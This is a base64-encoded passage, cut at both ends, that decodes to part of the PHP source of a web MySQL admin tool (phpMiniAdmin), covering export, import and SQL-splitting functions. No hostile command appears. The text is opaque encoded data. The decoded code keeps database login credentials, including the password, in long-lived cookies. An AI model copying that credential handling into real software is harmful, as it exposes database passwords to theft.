cF9wPT0kcGcpew0KICAgICAgICAkcmVzLj0iPGI+JGZpcnN0X3MuLiRsYXN0X3M8L2I+IjsNCiAgICAgfWVsc2V7DQogICAgICAgICRyZXMuPSI8YSBocmVmPSckcG5hbWUnPiRmaXJzdF9zLi4kbGFzdF9zPC9hPiI7DQogICAgIH0NCiAgICAgaWYoJHBfcCsxPCRhbGxwKSAkcmVzLj0kc2VwOw0KICB9DQogIGlmKCRzcCs1PCRhbGxwKXsNCiAgICAkcG5hbWU9cGVuKCRzcCs1LCRwdHBsKTsNCiAgICAkcmVzLj0iPGEgaHJlZj0nJHBuYW1lJz4kd1sxXTwvYT4iOw0KICB9DQogICRyZXMuPSIgPGJyPlxuIjsNCg0KICBpZigkcGc+MCl7DQogICAgJHBuYW1lPXBlbigkcGctMSwkcHRwbCk7DQogICAgJHJlcy49IjxhIGhyZWY9JyRwbmFtZSc+JHdbMl08L2E+ICRufCRuICI7DQogICAgJHBuYW1lPXBlbigwLCRwdHBsKTsNCiAgICAkcmVzLj0iPGEgaHJlZj0nJHBuYW1lJz4kd1s0XTwvYT4iOw0KICB9DQogIGlmKCRwZz4wICYmICRwZysxPCRhbGxwKSAkcmVzLj0kc2VwOw0KICBpZigkcGcrMTwkYWxscCl7DQogICAgJHBuYW1lPXBlbigkcGcrMSwkcHRwbCk7DQogICAgJHJlcy49IjxhIGhyZWY9JyRwbmFtZSc+JHdbM108L2E+IjsNCiAgfQ0KICBpZiAoJHNob3dfYWxsKSAkcmVzLj0iIDxiPigkd1s1XSAtICRhbGwpPC9iPiAiOw0KDQogIHJldHVybiAkcmVzOw0KfQ0KDQpmdW5jdGlvbiBwZW4oJHAsJG5wPScnKXsNCiByZXR1cm4gc3RyX3JlcGxhY2UoJyVwJScsJHAsICRucCk7DQp9DQoNCmZ1bmN0aW9uIGtpbGxtcSgkdmFsdWUpew0KIHJldHVybiBpc19hcnJheSgkdmFsdWUpP2FycmF5X21hcCgna2lsbG1xJywkdmFsdWUpOnN0cmlwc2xhc2hlcygkdmFsdWUpOw0KfQ0KDQpmdW5jdGlvbiBzYXZlY2ZnKCl7DQogJHY9JF9SRVFVRVNUWyd2J107DQogJF9TRVNTSU9OWydEQiddPSR2Ow0KIHVuc2V0KCRfU0VTU0lPTlsnc3FsX3NkJ10pOw0KDQogaWYgKCRfUkVRVUVTVFsncm1iJ10pew0KICAgICR0bT10aW1lKCkrNjAqNjAqMjQqMzA7DQogICAgbmV3Y29va2llKCJjb25uW2RiXSIsICAkdlsnZGInXSwkdG0pOw0KICAgIG5ld2Nvb2tpZSgiY29ublt1c2VyXSIsJHZbJ3VzZXInXSwkdG0pOw0KICAgIG5ld2Nvb2tpZSgiY29ubltwd2RdIiwgJHZbJ3B3ZCddLCR0bSk7DQogICAgbmV3Y29va2llKCJjb25uW2hvc3RdIiwkdlsnaG9zdCddLCR0bSk7DQogICAgbmV3Y29va2llKCJjb25uW3BvcnRdIiwkdlsncG9ydCddLCR0bSk7DQogICAgbmV3Y29va2llKCJjb25uW2Noc2V0XSIsJHZbJ2Noc2V0J10sJHRtKTsNCiB9ZWxzZXsNCiAgICBuZXdjb29raWUoImNvbm5bZGJdIiwgIEZBTFNFLC0xKTsNCiAgICBuZXdjb29raWUoImNvbm5bdXNlcl0iLEZBTFNFLC0xKTsNCiAgICBuZXdjb29raWUoImNvbm5bcHdkXSIsIEZBTFNFLC0xKTsNCiAgICBuZXdjb29raWUoImNvbm5baG9zdF0iLEZBTFNFLC0xKTsNCiAgICBuZXdjb29raWUoImNvbm5bcG9ydF0iLEZBTFNFLC0xKTsNCiAgICBuZXdjb29raWUoImNvbm5bY2hzZXRdIixGQUxTRSwtMSk7DQogfQ0KfQ0KDQovLyBBbGxvdyBodHRwb25seSBjb29raWVzLCBvciB0aGUgcGFzc3dvcmQgaXMgc3RvcmVkIHBsYWluIHRleHQgaW4gYSBjb29raWUNCmZ1bmN0aW9uIG5ld2Nvb2tpZSgkbiwkdiwkZSl7JHg7cmV0dXJuIHNldGNvb2tpZSgkbiwkdiwkZSwkeCwkeCwhISR4LCEkeCk7fQ0KDQovL2R1cmluZyBsb2dpbiBvbmx5IC0gZnJvbSBjb29raWVzIG9yIHVzZSBkZWZhdWx0czsNCmZ1bmN0aW9uIGxvYWRjZmcoKXsNCiBnbG9iYWwgJERCREVGOw0KDQogaWYoIGlzc2V0KCRfQ09PS0lFWydjb25uJ10pICl7DQogICAgJF9TRVNTSU9OWydEQiddPSRfQ09PS0lFWydjb25uJ107DQogfWVsc2V7DQogICAgJF9TRVNTSU9OWydEQiddPSREQkRFRjsNCiB9DQogaWYgKCFzdHJsZW4oJF9TRVNTSU9OWydEQiddWydjaHNldCddKSkgJF9TRVNTSU9OWydEQiddWydjaHNldCddPSREQkRFRlsnY2hzZXQnXTsjZG9uJ3QgYWxsb3cgZW1wdHkgY2hhcnNldA0KfQ0KDQovL2VhY2ggdGltZSAtIGZyb20gc2Vzc2lvbiB0byAkREJfKg0KZnVuY3Rpb24gbG9hZHNlc3MoKXsNCiBnbG9iYWwgJERCLCAkaXNfc207DQoNCiAkREI9JF9TRVNTSU9OWydEQiddOw0KDQogJHJkYj0kX1JFUVVFU1RbJ2RiJ107DQogaWYgKCRyZGI9PScqJykgJHJkYj0nJzsNCiBpZiAoJHJkYikgew0KICAgICREQlsnZGInXT0kcmRiOw0KIH0NCiBpZigkX1JFUVVFU1RbJ0dvU1FMJ10pICRfU0VTU0lPTlsnaXNfc20nXT0kX1JFUVVFU1RbJ2lzX3NtJ10rMDsNCiAkaXNfc209JF9TRVNTSU9OWydpc19zbSddKzA7DQp9DQoNCmZ1bmN0aW9uIHByaW50X2V4cG9ydCgpew0KIGdsb2JhbCAkc2VsZiwkeHVybCwkREIsJERVTVBfRklMRTsNCiAkdD0kX1JFUVVFU1RbJ3J0J107DQogJGw9KCR0KT8iVGFibGUgJHQiOiJ3aG9sZSBEQiI7DQogcHJpbnRfaGVhZGVyKCk7DQo/Pg0KPGNlbnRlcj4NCjxoMz5FeHBvcnQgPD9waHAgZW8oJGwpPz48L2gzPg0KPGRpdiBjbGFzcz0iZnJtIj4NCjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0icyIgdmFsdWU9IjEiIGNoZWNrZWQ+IFN0cnVjdHVyZTxicj4NCjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iZCIgdmFsdWU9IjEiIGNoZWNrZWQ+IERhdGE8YnI+PGJyPg0KPGRpdj48bGFiZWw+PGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJldCIgdmFsdWU9IiIgY2hlY2tlZD4gLnNxbDwvbGFiZWw+Jm5ic3A7PC9kaXY+DQo8ZGl2Pg0KPD9waHAgaWYgKCR0ICYmICFzdHJwb3MoJHQsJywnKSl7Pz4NCiA8bGFiZWw+PGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJldCIgdmFsdWU9ImNzdiI+IC5jc3YgKEV4Y2VsIHN0eWxlLCBkYXRhIG9ubHkgYW5kIGZvciBvbmUgdGFibGUgb25seSk8L2xhYmVsPg0KPD9waHAgfWVsc2V7Pz4NCjxsYWJlbD4mbmJzcDsoICkgLmNzdjwvbGFiZWw+IDxzbWFsbD4odG8gZXhwb3J0IGFzIGNzdiAtIGdvIHRvICdzaG93IHRhYmxlcycgYW5kIGV4cG9ydCBqdXN0IE9ORSB0YWJsZSk8L3NtYWxsPg0KPD9waHAgfT8+DQo8L2Rpdj4NCjxicj4NCjxkaXY+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ic3AiIHZhbHVlPSIxIj4gaW1wb3J0IGhhcyBzdXBlciBwcml2aWxlZ2VzPC9sYWJlbD48L2Rpdj4NCjxkaXY+PGxhYmVsPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iZ3oiIHZhbHVlPSIxIj4gY29tcHJlc3MgYXMgLmd6PC9sYWJlbD48L2Rpdj4NCjxicj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRvZXgiIHZhbHVlPSIxIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InJ0IiB2YWx1ZT0iPD9waHAgZW8oJHQpPz4iPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IiBEb3dubG9hZCAiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3J2IiB2YWx1ZT0iIER1bXAgb24gU2VydmVyICI+DQo8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iIENhbmNlbCAiIG9uY2xpY2s9IndpbmRvdy5sb2NhdGlvbj0nPD9waHAgZW8oJHNlbGYuJz8nLiR4dXJsLicmZGI9Jy51ZSgkREJbJ2RiJ10pKT8+JyI+DQo8cD48c21hbGw+IkR1bXAgb24gU2VydmVyIiBleHBvcnRzIHRvIGZpbGU6PGJyPjw/cGhwIGVvKGV4cG9ydF9mbmFtZSgkRFVNUF9GSUxFKS4nLnNxbCcpPz48L3NtYWxsPjwvcD4NCjwvZGl2Pg0KPC9jZW50ZXI+DQo8P3BocA0KIHByaW50X2Zvb3RlcigpOw0KIGV4aXQ7DQp9DQoNCmZ1bmN0aW9uIGV4cG9ydF9mbmFtZSgkZiwkaXN0PWZhbHNlKXsNCiAkdD0kaXN0P2RhdGUoJ1ktbS1kLUhpcycpOidZWVlZLU1NLURELUhITU1TUyc7DQogcmV0dXJuICRmLiR0Ow0KfQ0KDQpmdW5jdGlvbiBkb19leHBvcnQoKXsNCiBnbG9iYWwgJERCLCRWRVJTSU9OLCRELCRCT00sJGV4X2lzZ3osJGV4X2lzc3J2LCRkYmgsJG91dF9tZXNzYWdlOw0KICRydD1zdHJfcmVwbGFjZSgnYCcsJycsJF9SRVFVRVNUWydydCddKTsNCiAkdD1leHBsb2RlKCIsIiwkcnQpOw0KICR0aD1hcnJheV9mbGlwKCR0KTsNCiAkY3Q9Y291bnQoJHQpOw0KICR6PWRiX3Jvdygic2hvdyB2YXJpYWJsZXMgbGlrZSAnbWF4X2FsbG93ZWRfcGFja2V0JyIpOw0KICRNQVhJPWZsb29yKCR6WydWYWx1ZSddKjAuOCk7DQogaWYoISRNQVhJKSRNQVhJPTgzODg2MDsNCiAkYWV4dD0nJzskY3RwPScnOw0KDQogJGV4X3N1cGVyPSgkX1JFUVVFU1RbJ3NwJ10pPzE6MDsNCiAkZXhfaXNnej0oJF9SRVFVRVNUWydneiddKT8xOjA7DQogaWYgKCRleF9pc2d6KSB7DQogICAgJGFleHQ9Jy5neic7JGN0cD0nYXBwbGljYXRpb24veC1nemlwJzsNCiB9DQogJGV4X2lzc3J2PSgkX1JFUVVFU1RbJ3NydiddKT8xOjA7DQoNCiBpZiAoJGN0PT0xJiYkX1JFUVVFU1RbJ2V0J109PSdjc3YnKXsNCiAgZXhfc3RhcnQoJy5jc3YnKTsNCiAgZXhfaGRyKCRjdHA/JGN0cDondGV4dC9jc3YnLCIkdFswXS5jc3YkYWV4dCIpOw0KICBpZiAoJERCWydjaHNldCddPT0ndXRmOCcpIGV4X3coJEJPTSk7DQoNCiAgJHN0aD1kYl9xdWVyeSgic2VsZWN0ICogZnJvbSBgJHRbMF1gIixOVUxMLDAsTVlTUUxJX1VTRV9SRVNVTFQpOw0KICAkZm49bXlzcWxpX2ZpZWxkX2NvdW50KCRkYmgpOw0KICBmb3IoJGk9MDskaTwkZm47JGkrKyl7DQogICAkbT1teXNxbGlfZmV0Y2hfZmllbGQoJHN0aCk7DQogICBleF93KHFzdHIoJG0tPm5hbWUpLigoJGk8JGZuLTEpPyIsIjoiIikpOw0KICB9DQogIGV4X3coJEQpOw0KICB3aGlsZSgkcm93PW15c3FsaV9mZXRjaF9yb3coJHN0aCkpIGV4X3codG9fY3N2X3Jvdygkcm93KSk7DQogIG15c3FsaV9mcmVlX3Jlc3VsdCgkc3RoKTsNCiB9ZWxzZXsNCiAgZXhfc3RhcnQoJy5zcWwnKTsNCiAgZXhfaGRyKCRjdHA/JGN0cDondGV4dC9wbGFpbicsIiREQltkYl0iLigoJGN0PT0xJiYkdFswXSk/Ii4kdFswXSI6KCgkY3Q+MSk/Jy4nLiRjdC4ndGFibGVzJzonJykpLiIuc3FsJGFleHQiKTsNCiAgZXhfdygiLS0gcGhwTWluaUFkbWluIGR1bXAgJFZFUlNJT04kRC0tIERhdGV0aW1lOiAiLmRhdGUoJ1ktbS1kIEg6aTpzJykuIiRELS0gSG9zdDogJERCW2hvc3RdJEQtLSBEYXRhYmFzZTogJERCW2RiXSREJEQiKTsNCiAgaWYgKCREQlsnY2hzZXQnXSkgZXhfdygiLyohNDAwMzAgU0VUIE5BTUVTICREQltjaHNldF0gKi87JEQiKTsNCiAgJGV4X3N1cGVyICYmIGV4X3coIi8qITQwMDMwIFNFVCBHTE9CQUwgbWF4X2FsbG93ZWRfcGFja2V0PTE2Nzc3MjE2ICovOyREJEQiKTsNCiAgZXhfdygiLyohNDAwMTQgU0VUIEBPTERfRk9SRUlHTl9LRVlfQ0hFQ0tTPUBARk9SRUlHTl9LRVlfQ0hFQ0tTLCBGT1JFSUdOX0tFWV9DSEVDS1M9MCAqLzskRCREIik7DQoNCiAgJHN0aD1kYl9xdWVyeSgic2hvdyBmdWxsIHRhYmxlcyBmcm9tIGAkREJbZGJdYCIpOw0KICB3aGlsZSgkcm93PW15c3FsaV9mZXRjaF9yb3coJHN0aCkpew0KICAgIGlmICghJHJ0fHxhcnJheV9rZXlfZXhpc3RzKCRyb3dbMF0sJHRoKSkgZG9fZXhwb3J0X3RhYmxlKCRyb3dbMF0sJHJvd1sxXSwkTUFYSSk7DQogIH0NCg0KICBleF93KCIvKiE0MDAxNCBTRVQgRk9SRUlHTl9LRVlfQ0hFQ0tTPUBPTERfRk9SRUlHTl9LRVlfQ0hFQ0tTICovOyREJEQiKTsNCiAgZXhfdygiJEQtLSBwaHBNaW5pQWRtaW4gZHVtcCBlbmQkRCIpOw0KIH0NCiBleF9lbmQoKTsNCiBpZiAoISRleF9pc3NydikgZXhpdDsNCiAkb3V0X21lc3NhZ2U9J0V4cG9ydCBkb25lIHN1Y2Nlc3NmdWxseSc7DQp9DQoNCmZ1bmN0aW9uIGRvX2V4cG9ydF90YWJsZSgkdD0nJywkdHQ9JycsJE1BWEk9ODM4ODYwKXsNCiBnbG9iYWwgJEQsJGV4X2lzc3J2Ow0KIEBzZXRfdGltZV9saW1pdCg2MDApOw0KDQogaWYoJF9SRVFVRVNUWydzJ10pew0KICAkc3RoPWRiX3F1ZXJ5KCJzaG93IGNyZWF0ZSB0YWJsZSBgJHRgIik7DQogICRyb3c9bXlzcWxpX2ZldGNoX3Jvdygkc3RoKTsNCiAgJGN0PXByZWdfcmVwbGFjZSgiL1xuXHJ8XHJcbnxcbnxcci8iLCRELCRyb3dbMV0pOw0KICBleF93KCJEUk9QIFRBQkxFIElGIEVYSVNUUyBgJHRgOyREJGN0OyREJEQiKTsNCiB9DQoNCiBpZiAoJF9SRVFVRVNUWydkJ10mJiR0dCE9J1ZJRVcnKXsvL25vIGR1bXAgZm9yIHZpZXdzDQogICRleHNxbD0nJzsNCiAgZXhfdygiLyohNDAwMDAgQUxURVIgVEFCTEUgYCR0YCBESVNBQkxFIEtFWVMgKi87JEQiKTsNCiAgJHN0aD1kYl9xdWVyeSgic2VsZWN0ICogZnJvbSBgJHRgIixOVUxMLDAsTVlTUUxJX1VTRV9SRVNVTFQpOw0KICB3aGlsZSgkcm93PW15c3FsaV9mZXRjaF9yb3coJHN0aCkpew0KICAgICR2YWx1ZXM9Jyc7DQogICAgZm9yZWFjaCgkcm93IGFzICR2KSAkdmFsdWVzLj0oKCR2YWx1ZXMpPycsJzonJykuZGJxKCR2KTsNCiAgICAkZXhzcWwuPSgoJGV4c3FsKT8nLCc6JycpLiIoIi4kdmFsdWVzLiIpIjsNCiAgICBpZiAoc3RybGVuKCRleHNxbCk+JE1BWEkpIHsNCiAgICAgICBleF93KCJJTlNFUlQgSU5UTyBgJHRgIFZBTFVFUyAkZXhzcWw7JEQiKTskZXhzcWw9Jyc7DQogICAgfQ0KICB9DQogIG15c3FsaV9mcmVlX3Jlc3VsdCgkc3RoKTsNCiAgaWYgKCRleHNxbCkgZXhfdygiSU5TRVJUIElOVE8gYCR0YCBWQUxVRVMgJGV4c3FsOyREIik7DQogIGV4X3coIi8qITQwMDAwIEFMVEVSIFRBQkxFIGAkdGAgRU5BQkxFIEtFWVMgKi87JEQkRCIpOw0KIH0NCiBpZiAoISRleF9pc3NydikgZmx1c2goKTsNCn0NCg0KZnVuY3Rpb24gZXhfaGRyKCRjdCwkZm4pew0KIGdsb2JhbCAkZXhfaXNzcnY7DQogaWYgKCRleF9pc3NydikgcmV0dXJuOw0KIGhlYWRlcigiQ29udGVudC10eXBlOiAkY3QiKTsNCiBoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPVwiJGZuXCIiKTsNCn0NCmZ1bmN0aW9uIGV4X3N0YXJ0KCRleHQpew0KIGdsb2JhbCAkZXhfaXNneiwkZXhfZ3osJGV4X3RtcGYsJGV4X2lzc3J2LCRleF9mLCREVU1QX0ZJTEU7DQogaWYgKCRleF9pc2d6KXsNCiAgICAkZXhfdG1wZj0oJGV4X2lzc3J2P2V4cG9ydF9mbmFtZSgkRFVNUF9GSUxFLHRydWUpLiRleHQ6dG1wX25hbWUoKSkuJy5neic7DQogICAgaWYgKCEoJGV4X2d6PWd6b3BlbigkZXhfdG1wZiwnd2I5JykpKSBkaWUoIkVycm9yIHRyeWluZyB0byBjcmVhdGUgZ3ogdG1wIGZpbGUiKTsNCiB9ZWxzZXsNCiAgICBpZiAoJGV4X2lzc3J2KSB7DQogICAgICBpZiAoISgkZXhfZj1mb3BlbihleHBvcnRfZm5hbWUoJERVTVBfRklMRSx0cnVlKS4kZXh0LCd3YicpKSkgZGllKCJFcnJvciB0cnlpbmcgdG8gY3JlYXRlIGR1bXAgZmlsZSIpOw0KICAgIH0NCiB9DQp9DQpmdW5jdGlvbiBleF93KCRzKXsNCiBnbG9iYWwgJGV4X2lzZ3osJGV4X2d6LCRleF9pc3NydiwkZXhfZjsNCiBpZiAoJGV4X2lzZ3opew0KICAgIGd6d3JpdGUoJGV4X2d6LCRzLHN0cmxlbigkcykpOw0KIH1lbHNlew0KICAgIGlmICgkZXhfaXNzcnYpew0KICAgICAgICBmd3JpdGUoJGV4X2YsJHMpOw0KICAgIH1lbHNlew0KICAgICAgICBlY2hvICRzOw0KICAgIH0NCiB9DQp9DQpmdW5jdGlvbiBleF9lbmQoKXsNCiBnbG9iYWwgJGV4X2lzZ3osJGV4X2d6LCRleF90bXBmLCRleF9pc3NydiwkZXhfZjsNCiBpZiAoJGV4X2lzZ3opew0KICAgIGd6Y2xvc2UoJGV4X2d6KTsNCiAgICBpZiAoISRleF9pc3Nydil7DQogICAgICByZWFkZmlsZSgkZXhfdG1wZik7DQogICAgICB1bmxpbmsoJGV4X3RtcGYpOw0KICAgIH0NCiB9ZWxzZXsNCiAgICBpZiAoJGV4X2lzc3J2KSBmY2xvc2UoJGV4X2YpOw0KIH0NCn0NCg0KZnVuY3Rpb24gcHJpbnRfaW1wb3J0KCl7DQogZ2xvYmFsICRzZWxmLCR4dXJsLCREQiwkRFVNUF9GSUxFOw0KIHByaW50X2hlYWRlcigpOw0KPz4NCjxjZW50ZXI+DQo8aDM+SW1wb3J0IERCPC9oMz4NCjxkaXYgY2xhc3M9ImZybSI+DQo8ZGl2PjxsYWJlbD48aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9Iml0IiB2YWx1ZT0iIiBjaGVja2VkPiBpbXBvcnQgYnkgdXBsb2FkaW5nIDxiPi5zcWw8L2I+IG9yIDxiPi5nejwvYj4gZmlsZTo8L2xhYmVsPg0KIDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlMSIgdmFsdWU9IiIgc2l6ZT00MD48YnI+DQo8L2Rpdj4NCjxkaXY+PGxhYmVsPjxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0iaXQiIHZhbHVlPSJzcWwiPiBpbXBvcnQgZnJvbSBmaWxlIG9uIHNlcnZlcjo8YnI+DQogPD9waHAgZW8oJERVTVBfRklMRS4nLnNxbCcpPz48L2xhYmVsPjwvZGl2Pg0KPGRpdj48bGFiZWw+PGlucHV0IHR5cGU9InJhZGlvIiBuYW1lPSJpdCIgdmFsdWU9Imd6Ij4gaW1wb3J0IGZyb20gZmlsZSBvbiBzZXJ2ZXI6PGJyPg0KIDw/cGhwIGVvKCREVU1QX0ZJTEUuJy5zcWwuZ3onKT8+PC9sYWJlbD48L2Rpdj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRvaW0iIHZhbHVlPSIxIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSIgSW1wb3J0ICIgb25jbGljaz0icmV0dXJuIGF5cygpIj48aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iIENhbmNlbCAiIG9uY2xpY2s9IndpbmRvdy5sb2NhdGlvbj0nPD9waHAgZW8oJHNlbGYuJz8nLiR4dXJsLicmZGI9Jy51ZSgkREJbJ2RiJ10pKT8+JyI+DQo8L2Rpdj4NCjxicj48YnI+PGJyPg0KPCEtLQ0KPGgzPkltcG9ydCBvbmUgVGFibGUgZnJvbSBDU1Y8L2gzPg0KPGRpdiBjbGFzcz0iZnJtIj4NCi5jc3YgZmlsZSAoRXhjZWwgc3R5bGUpOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZTIiIHZhbHVlPSIiIHNpemU9NDA+PGJyPg0KPGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJyMSIgdmFsdWU9IjEiIGNoZWNrZWQ+IGZpcnN0IHJvdyBjb250YWluIGZpZWxkIG5hbWVzPGJyPg0KPHNtYWxsPihub3RlOiBmb3Igc3VjY2VzcywgZmllbGQgbmFtZXMgc2hvdWxkIGJlIGV4YWN0bHkgdGhlIHNhbWUgYXMgaW4gREIpPC9zbWFsbD48YnI+DQpDaGFyYWN0ZXIgc2V0IG9mIHRoZSBmaWxlOiA8c2VsZWN0IG5hbWU9ImNoc2V0Ij48P3BocCBlY2hvIGNoc2V0X3NlbGVjdCgndXRmOCcpPz48L3NlbGVjdD4NCjxicj48YnI+DQpJbXBvcnQgaW50bzo8YnI+DQo8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9InR0IiB2YWx1ZT0iMSIgY2hlY2tlZD0iY2hlY2tlZCI+IGV4aXN0aW5nIHRhYmxlOg0KIDxzZWxlY3QgbmFtZT0idCI+DQogPG9wdGlvbiB2YWx1ZT0nJz4tIHNlbGVjdCAtPC9vcHRpb24+DQogPD9waHAgZWNobyBzZWwoZGJfYXJyYXkoJ3Nob3cgdGFibGVzJyxOVUxMLDAsMSksIDAsICcnKTsgPz4NCjwvc2VsZWN0Pg0KPGRpdiBzdHlsZT0ibWFyZ2luLWxlZnQ6MjBweCI+DQogPGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJ0dHIiIHZhbHVlPSIxIj4gcmVwbGFjZSBleGlzdGluZyBEQiBkYXRhPGJyPg0KIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0idHRpIiB2YWx1ZT0iMSI+IGlnbm9yZSBkdXBsaWNhdGUgcm93cw0KPC9kaXY+DQo8aW5wdXQgdHlwZT0icmFkaW8iIG5hbWU9InR0IiB2YWx1ZT0iMiI+IGNyZWF0ZSBuZXcgdGFibGUgd2l0aCBuYW1lIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ0biIgdmFsdWU9IiIgc2l6ZT0iMjAiPg0KPGJyPjxicj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRvaW1jc3YiIHZhbHVlPSIxIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSIgVXBsb2FkIGFuZCBJbXBvcnQgIiBvbmNsaWNrPSJyZXR1cm4gYXlzKCkiPjxpbnB1dCB0eXBlPSJidXR0b24iIHZhbHVlPSIgQ2FuY2VsICIgb25jbGljaz0id2luZG93LmxvY2F0aW9uPSc8P3BocCBlbygkc2VsZik/PiciPg0KPC9kaXY+DQotLT4NCjwvY2VudGVyPg0KPD9waHANCiBwcmludF9mb290ZXIoKTsNCiBleGl0Ow0KfQ0KDQpmdW5jdGlvbiBkb19pbXBvcnQoKXsNCiBnbG9iYWwgJGVycl9tc2csJG91dF9tZXNzYWdlLCRkYmgsJFNIT1dfVCwkRFVNUF9GSUxFOw0KICRlcnJfbXNnPScnOw0KICRpdD0kX1JFUVVFU1RbJ2l0J107DQoNCiBpZiAoISRpdCl7DQogICAgJEY9JF9GSUxFU1snZmlsZTEnXTsNCiAgICBpZiAoJEYgJiYgJEZbJ25hbWUnXSl7DQogICAgICAgJGZpbGVuYW1lPSRGWyd0bXBfbmFtZSddOw0KICAgICAgICRwaT1wYXRoaW5mbygkRlsnbmFtZSddKTsNCiAgICAgICAkZXh0PSRwaVsnZXh0ZW5zaW9uJ107DQogICAgfQ0KIH1lbHNlew0KICAgICRleHQ9KCRpdD09J2d6Jz8nc3FsLmd6Jzonc3FsJyk7DQogICAgJGZpbGVuYW1lPSREVU1QX0ZJTEUuJy4nLiRleHQ7DQogfQ0KDQogaWYgKCRmaWxlbmFtZSAmJiBmaWxlX2V4aXN0cygkZmlsZW5hbWUpKXsNCiAgaWYgKCRleHQhPSdzcWwnKXsvL2lmIG5vdCBzcWwgLSBhc3N1bWUgLmd6IGFuZCBleHRyYWN0DQogICAgICR0bXBmPXRtcF9uYW1lKCk7DQogICAgIGlmICgoJGd6PWd6b3BlbigkZmlsZW5hbWUsJ3JiJykpICYmICgkdGY9Zm9wZW4oJHRtcGYsJ3diJykpKXsNCiAgICAgICAgd2hpbGUoIWd6ZW9mKCRneikpew0KICAgICAgICAgICBpZiAoZndyaXRlKCR0ZixnenJlYWQoJGd6LDgxOTIpLDgxOTIpPT09RkFMU0UpeyRlcnJfbXNnPSdFcnJvciBkdXJpbmcgZ3ogZmlsZSBleHRyYWN0aW9uIHRvIHRtcCBmaWxlJzticmVhazt9DQogICAgICAgIH0vL2V4dHJhY3QgdG8gdG1wIGZpbGUNCiAgICAgICAgZ3pjbG9zZSgkZ3opO2ZjbG9zZSgkdGYpOyRmaWxlbmFtZT0kdG1wZjsNCiAgICAgfWVsc2V7JGVycl9tc2c9J0Vycm9yIG9wZW5pbmcgZ3ogZmlsZSc7fQ0KICB9DQogIGlmICghJGVycl9tc2cpew0KICAgaWYgKCFkb19tdWx0aV9zcWwoJycsICRmaWxlbmFtZSkpew0KICAgICAgJGVycl9tc2c9J0ltcG9ydCBFcnJvcjogJy5teXNxbGlfZXJyb3IoJGRiaCk7DQogICB9ZWxzZXsNCiAgICAgICRvdXRfbWVzc2FnZT0nSW1wb3J0IGRvbmUgc3VjY2Vzc2Z1bGx5JzsNCiAgICAgIGRvX3NxbCgkU0hPV19UKTsNCiAgICAgIHJldHVybjsNCiAgfX0NCg0KIH1lbHNlew0KICAgICRlcnJfbXNnPSJFcnJvcjogUGxlYXNlIHNlbGVjdCBmaWxlIGZpcnN0IjsNCiB9DQogcHJpbnRfaW1wb3J0KCk7DQogZXhpdDsNCn0NCg0KLy8gbXVsdGlwbGUgU1FMIHN0YXRlbWVudHMgc3BsaXR0ZXINCmZ1bmN0aW9uIGRvX211bHRpX3NxbCgkaW5zcWwsJGZuYW1lPScnKXsNCiBAc2V0X3RpbWVfbGltaXQoNjAwKTsNCg0KICRzcWw9Jyc7DQogJG9jaGFyPScnOw0KICRpc19jbXQ9Jyc7DQogJEdMT0JBTFNbJ2luc3FsX2RvbmUnXT0wOw0KIHdoaWxlICgkc3RyPWdldF9uZXh0X2NodW5rKCRpbnNxbCwkZm5hbWUpKXsNCiAgICAkb3Bvcz0tc3RybGVuKCRvY2hhcik7DQogICAgJGN1cl9wb3M9MDsNCiAgICAkaT1zdHJsZW4oJHN0cik7DQogICAgd2hpbGUgKCRpLS0pew0KICAgICAgIGlmICgkb2NoYXIpew0KICAgICAgICAgIGxpc3QoJGNsY2hhciwgJGNscG9zKT1nZXRfY2xvc2VfY2hhcigkc3RyLCAkb3BvcytzdHJsZW4oJG9jaGFyKSwgJG9jaGFyKTsNCiAgICAgICAgICBpZiAoICRjbGNoYXIgKSB7DQogICAgICAgICAgICAgaWYgKCRvY2hhcj09Jy0tJyB8fCAkb2NoYXI9PScjJyB8fCAkaXNfY210ICl7DQogICAgICAgICAgICAgICAgJHNxbC49c3Vic3RyKCRzdHIsICRjdXJfcG9zLCAkb3Bvcy0kY3VyX3BvcyApOw0KICAgICAgICAgICAgIH1lbHNlew0KICAgICAgICAgICAgICAgICRzcWwuPXN1YnN0cigkc3RyLCAkY3VyX3BvcywgJGNscG9zK3N0cmxlbigkY2xjaGFyKS0kY3VyX3BvcyApOw0KICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAkY3VyX3Bvcz0kY2xwb3Mrc3RybGVuKCRjbGNoYXIpOw0KICAgICAgICAgICAgICRvY2hhcj0nJzsNCiAgICAgICAgICAgICAkb3Bvcz0wOw0KICAgICAgICAgIH1lbHNlew0KICAgICAgICAgICAgICRzcWwuPXN1YnN0cigkc3RyLCAkY3VyX3Bvcyk7DQogICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgfQ0KICAgICAgIH1lbHNlew0KICAgICAgICAgIGxpc3QoJG9jaGFyLCAkb3Bvcyk9Z2V0X29wZW5fY2hhcig